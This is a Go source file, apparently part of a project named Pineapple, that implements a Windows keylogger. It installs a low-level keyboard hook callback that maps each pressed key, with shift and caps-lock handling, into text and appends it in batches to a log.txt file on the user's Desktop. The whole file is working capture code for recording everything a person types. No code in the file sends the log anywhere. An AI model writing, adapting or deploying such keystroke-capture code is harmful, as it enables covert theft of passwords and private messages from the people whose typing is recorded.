package utils

import (
	"os"
	"strings"
	"unsafe"

	"github.com/MShoaei/Pineapple/windows"
)

var shift bool
var caps bool
var buffer strings.Builder
var logFilePath string
var logFile *os.File

func init() {
	logFilePath = Join(os.Getenv("USERPROFILE"), "Desktop", "log.txt")
	if _, err := os.Stat(logFilePath); os.IsNotExist(err) {
		logFile, _ = os.Create(logFilePath)
	} else {
		logFile, _ = os.OpenFile(logFilePath, os.O_RDWR, os.ModeAppend)
	}
	windows.GetKeyboardState(&KState)
	caps = KState[windows.VKCAPITAL] == 1
}

func Flush() {
	logFile.WriteString(buffer.String())
	buffer.Reset()
}

func Log(nCode int, wParam windows.WPARAM, lParam uintptr) windows.LRESULT {

	//WM_KEYDOWN 0x100
	if nCode == 0 && wParam == 0x100 {
		key := (*windows.KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		shiftchk := windows.GetKeyState(windows.VKLSHIFT) & 0x8000
		if shiftchk == 32768 {
			shift = true
		} else {
			shift = false
		}
		// windows.GetAsyncKeyState(&KState)
		// fmt.Println(KState[windows.VKSHIFT])
		// fmt.Println(KState[windows.VKLSHIFT])
		// fmt.Println(KState[windows.VKRSHIFT])
		// shift = KState[windows.VKSHIFT] == 0x80

		switch key.VkCode {

		case windows.VKCONTROL:
			buffer.WriteString("[Ctrl]")
		case windows.VKBACK:
			buffer.WriteString("[Back]")
		case windows.VKTAB:
			buffer.WriteString("[Tab]")
		case windows.VKRETURN:
			buffer.WriteString("[Enter]\r\n")
		case windows.VKSHIFT:
			buffer.WriteString("[Shift]")
		case windows.VKMENU:
			buffer.WriteString("[Alt]")
		case windows.VKCAPITAL:
			buffer.WriteString("[CapsLock]")
			if caps {
				caps = false
			} else {
				caps = true
			}
		case windows.VKESCAPE:
			buffer.WriteString("[Esc]")
		case windows.VKSPACE:
			buffer.WriteString(" ")
		case windows.VKPRIOR:
			buffer.WriteString("[PageUp]")
		case windows.VKNEXT:
			buffer.WriteString("[PageDown]")
		case windows.VKEND:
			buffer.WriteString("[End]")
		case windows.VKHOME:
			buffer.WriteString("[Home]")
		case windows.VKLEFT:
			buffer.WriteString("[Left]")
		case windows.VKUP:
			buffer.WriteString("[Up]")
		case windows.VKRIGHT:
			buffer.WriteString("[Right]")
		case windows.VKDOWN:
			buffer.WriteString("[Down]")
		case windows.VKSELECT:
			buffer.WriteString("[Select]")
		case windows.VKPRINT:
			buffer.WriteString("[Print]")
		case windows.VKEXECUTE:
			buffer.WriteString("[Execute]")
		case windows.VKSNAPSHOT:
			buffer.WriteString("[PrintScreen]")
		case windows.VKINSERT:
			buffer.WriteString("[Insert]")
		case windows.VKDELETE:
			buffer.WriteString("[Delete]")
		case windows.VKLWIN:
			buffer.WriteString("[LeftWindows]")
		case windows.VKRWIN:
			buffer.WriteString("[RightWindows]")
		case windows.VKAPPS:
			buffer.WriteString("[Applications]")
		case windows.VKSLEEP:
			buffer.WriteString("[Sleep]")
		case windows.VKNUMPAD0:
			buffer.WriteString("[Pad 0]")
		case windows.VKNUMPAD1:
			buffer.WriteString("[Pad 1]")
		case windows.VKNUMPAD2:
			buffer.WriteString("[Pad 2]")
		case windows.VKNUMPAD3:
			buffer.WriteString("[Pad 3]")
		case windows.VKNUMPAD4:
			buffer.WriteString("[Pad 4]")
		case windows.VKNUMPAD5:
			buffer.WriteString("[Pad 5]")
		case windows.VKNUMPAD6:
			buffer.WriteString("[Pad 6]")
		case windows.VKNUMPAD7:
			buffer.WriteString("[Pad 7]")
		case windows.VKNUMPAD8:
			buffer.WriteString("[Pad 8]")
		case windows.VKNUMPAD9:
			buffer.WriteString("[Pad 9]")
		case windows.VKMULTIPLY:
			buffer.WriteString("*")
		case windows.VKADD:
			if shift {
				buffer.WriteString("+")
			} else {
				buffer.WriteString("=")
			}
		case windows.VKSEPARATOR:
			buffer.WriteString("[Separator]")
		case windows.VKSUBTRACT:
			if shift {
				buffer.WriteString("_")
			} else {
				buffer.WriteString("-")
			}
		case windows.VKDECIMAL:
			buffer.WriteString(".")
		case windows.VKDIVIDE:
			buffer.WriteString("[Devide]")
		case windows.VKF1:
			buffer.WriteString("[F1]")
		case windows.VKF2:
			buffer.WriteString("[F2]")
		case windows.VKF3:
			buffer.WriteString("[F3]")
		case windows.VKF4:
			buffer.WriteString("[F4]")
		case windows.VKF5:
			buffer.WriteString("[F5]")
		case windows.VKF6:
			buffer.WriteString("[F6]")
		case windows.VKF7:
			buffer.WriteString("[F7]")
		case windows.VKF8:
			buffer.WriteString("[F8]")
		case windows.VKF9:
			buffer.WriteString("[F9]")
		case windows.VKF10:
			buffer.WriteString("[F10]")
		case windows.VKF11:
			buffer.WriteString("[F11]")
		case windows.VKF12:
			buffer.WriteString("[F12]")
		case windows.VKNUMLOCK:
			buffer.WriteString("[NumLock]")
		case windows.VKSCROLL:
			buffer.WriteString("[ScrollLock]")
		case windows.VKLSHIFT:
			buffer.WriteString("[LeftShift]")
		case windows.VKRSHIFT:
			buffer.WriteString("[RightShift]")
		case windows.VKLCONTROL:
			buffer.WriteString("[LeftCtrl]")
		case windows.VKRCONTROL:
			buffer.WriteString("[RightCtrl]")
		case windows.VKLMENU:
			buffer.WriteString("[LeftMenu]")
		case windows.VKRMENU:
			buffer.WriteString("[RightMenu]")
		case windows.VKOEM1:
			if shift {
				buffer.WriteString(":")
			} else {
				buffer.WriteString(";")
			}
		case windows.VKOEM2:
			if shift {
				buffer.WriteString("?")
			} else {
				buffer.WriteString("/")
			}
		case windows.VKOEM3:
			if shift {
				buffer.WriteString("~")
			} else {
				buffer.WriteString("`")
			}
		case windows.VKOEM4:
			if shift {
				buffer.WriteString("{")
			} else {
				buffer.WriteString("[")
			}
		case windows.VKOEM5:
			if shift {
				buffer.WriteString("|")
			} else {
				buffer.WriteString("\\")
			}
		case windows.VKOEM6:
			if shift {
				buffer.WriteString("}")
			} else {
				buffer.WriteString("]")
			}
		case windows.VKOEM7:
			if shift {
				buffer.WriteString(`"`)
			} else {
				buffer.WriteString("'")
			}
		case windows.VKOEMPERIOD:
			if shift {
				buffer.WriteString(">")
			} else {
				buffer.WriteString(".")
			}
		case 0x30:
			if shift {
				buffer.WriteString(")")
			} else {
				buffer.WriteString("0")
			}
		case 0x31:
			if shift {
				buffer.WriteString("!")
			} else {
				buffer.WriteString("1")
			}
		case 0x32:
			if shift {
				buffer.WriteString("@")
			} else {
				buffer.WriteString("2")
			}
		case 0x33:
			if shift {
				buffer.WriteString("#")
			} else {
				buffer.WriteString("3")
			}
		case 0x34:
			if shift {
				buffer.WriteString("$")
			} else {
				buffer.WriteString("4")
			}
		case 0x35:
			if shift {
				buffer.WriteString("%")
			} else {
				buffer.WriteString("5")
			}
		case 0x36:
			if shift {
				buffer.WriteString("^")
			} else {
				buffer.WriteString("6")
			}
		case 0x37:
			if shift {
				buffer.WriteString("&")
			} else {
				buffer.WriteString("7")
			}
		case 0x38:
			if shift {
				buffer.WriteString("*")
			} else {
				buffer.WriteString("8")
			}
		case 0x39:
			if shift {
				buffer.WriteString("(")
			} else {
				buffer.WriteString("9")
			}
		}
		switch {
		case 0x41 <= key.VkCode && key.VkCode <= 0x5A:
			char := ToUnicode(key)
			if shift != caps {
				buffer.WriteString(strings.ToUpper(char))
			} else {
				buffer.WriteString(char)
			}
		}
		if buffer.Len() >= 20 {
			Flush()
		}
	}

	return windows.CallNextHookEx(0, nCode, wParam, windows.LPARAM(lParam))
}
